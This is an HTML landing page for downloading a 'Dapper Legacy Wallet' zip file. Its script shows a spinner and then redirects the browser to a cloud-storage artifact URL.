<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    <title>Dapper Legacy Wallet</title>
    <style>
        :root {
            --dapper-purple: #7C3AED;
            --dapper-pink: #EC4899;
            --dapper-blue: #60A5FA;
            --dapper-mint: #34D399;
            --dapper-yellow: #FBBF24;
        }
        
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            background: linear-gradient(135deg, var(--dapper-blue) 0%, var(--dapper-mint) 100%);
            color: #333;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
            text-align: center;
            position: relative;
        }
        .logo {
            margin-bottom: 2rem;
        }
        .logo h1 {
            color: white;
            font-size: 3rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        .download-message {
            background: rgba(255, 255, 255, 0.9);
            padding: 3rem;
            border-radius: 24px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            margin: 2rem auto;
            max-width: 600px;
            backdrop-filter: blur(10px);
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: var(--dapper-purple);
            animation: spin 1s linear infinite;
            margin: 2rem auto;
            display: none;
        }
        .checkmark {
            width: 36px;
            height: 36px;
            margin: 2rem auto;
            display: none;
        }
        .checkmark::before {
            content: "âœ“";
            color: var(--dapper-mint);
            font-size: 36px;
            line-height: 36px;
        }
        .download-button {
            background: linear-gradient(135deg, var(--dapper-purple) 0%, var(--dapper-pink) 100%);
            color: white;
            border: none;
            padding: 1.25rem 2.5rem;
            font-size: 1.5rem;
            font-weight: 600;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: block;
            margin: 2rem auto;
            width: 300px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
            box-shadow: 0 4px 16px rgba(236, 72, 153, 0.3);
        }
        .download-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(236, 72, 153, 0.4);
        }
        .download-button:active {
            transform: translateY(1px);
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Dapper</h1>
        </div>
        <div class="download-message">
            <h2>Legacy Wallet Download</h2>
            <button class="download-button" id="downloadBtn">Download Now</button>
            <div class="spinner" id="spinner"></div>
            <div class="checkmark" id="checkmark"></div>
            <p id="status-text">Click the button above to start your download</p>
        </div>
    </div>
    <script>
        document.getElementById('downloadBtn').addEventListener('click', function() {
            // Hide button and show spinner
            this.style.display = 'none';
            document.getElementById('spinner').style.display = 'block';
            document.getElementById('status-text').textContent = 'Preparing your download...';
            
            // Start download after a short delay
            setTimeout(() => {
                window.location.href = 'https://storage.googleapis.com/dapper-eth-production_artifacts/1.0.0.44_0.zip';
                
                // Show success state after download starts
                setTimeout(() => {
                    document.getElementById('spinner').style.display = 'none';
                    document.getElementById('checkmark').style.display = 'block';
                    document.getElementById('status-text').textContent = 'Download started! Please check your downloads folder.';
                }, 1000);
            }, 2000);
        });
    </script>
</body>
</html>
